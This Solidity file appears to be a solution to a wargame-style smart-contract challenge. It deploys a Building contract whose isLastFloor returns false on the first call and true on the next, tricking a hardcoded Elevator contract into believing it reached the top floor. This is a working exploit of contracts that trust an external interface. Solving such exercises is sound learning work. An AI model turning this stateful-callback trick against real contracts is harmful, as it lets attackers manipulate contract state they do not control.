// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IElevator {
    function goTo(uint256) external;
}

interface IBuilding {
    function isLastFloor(uint256) external returns (bool);
}

contract Building is IBuilding {
    IElevator public elevator = IElevator(0xe1bF10BA20A7C21B1c671Fb21FAaD4c607d0bd39);

    bool public isFirstCall = true;

    constructor() {}

    function toLastFloor() external returns (bool) {
        elevator.goTo(1);
    }

    function isLastFloor(uint256 floor) external returns (bool) {
        if (isFirstCall) {
            isFirstCall = false;
            return false;
        }

        return true;
    }
}
